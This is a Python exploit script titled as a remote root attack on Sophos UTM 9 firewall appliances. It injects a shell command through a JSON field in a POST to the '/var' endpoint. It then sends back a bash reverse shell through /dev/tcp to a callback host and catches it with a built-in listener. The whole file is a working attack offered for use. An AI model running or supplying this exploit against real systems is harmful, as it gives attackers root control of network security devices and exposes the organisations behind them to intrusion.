#!/usr/bin/env python2
# coding: utf-8
# Sophos UTM 9 Remote Root
import requests
import sys
import telnetlib
import socket
from threading import Thread
from requests.packages.urllib3.exceptions import InsecureRequestWarning
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)
import time

def handler(lp): # handler borrowed from Stephen Seeley.
    print "(+) starting handler on port %d" %(lp)
    t = telnetlib.Telnet()
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.bind(("0.0.0.0", lp))
    s.listen(1)
    conn, addr = s.accept()
    print "(+) connection from %s" %(addr[0])
    t.sock = conn
    print "(+) pop thy shell!"
    t.interact()
    
def execute_command(target, command):
     url = target + "/var"
     headers = {"User-Agent": "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:91.0) Gecko/20100101 Firefox/91.0",
                "Accept": "text/javascript, text/html, application/xml, text/xml, */*",
                "Accept-Language": "en-US,en;q=0.5",
                "Accept-Encoding": "gzip, deflate",
                "X-Requested-With": "XMLHttpRequest",
                "X-Prototype-Version": "1.5.1.1",
                "Content-type": "application/json; charset=UTF-8"}
     data = '{"objs": [{"FID": "init"}], "SID": "|%s|", "browser": "gecko_linux", "backend_version": -1, "loc": "' %(command)
     data += '", "_cookie": null, "wdebug": 0, "RID": "1629210675639_0.5000855117488202", "current_uuid": "", "ipv6": true}'
     r = requests.post(url=url, data=data, verify=False, headers=headers)
     
def pop_reverse_shell(target, cb_host, cb_port):
    print "(+) Sending callback to %s:%s" %(cb_host, cb_port)
    backconnect = "nohup bash -i >& /dev/tcp/%s/%s 0>&1 &" %(cb_host, cb_port)
    execute_command(target=target, command=backconnect)

def hack_the_planet(target, cb_host, cb_port):
    handlerthr = Thread(target=handler, args=(int(cb_port),))
    handlerthr.start()
    pop_reverse_shell(target=target, cb_host=cb_host, cb_port=cb_port)
    
def main(args):
    if len(args) != 4:
        sys.exit("use: %s https://some-utm.lol:4443 hacke.rs 80" %(args[0]))
    hack_the_planet(target=args[1], cb_host=args[2], cb_port=args[3])

if __name__ == "__main__":
    main(args=sys.argv)
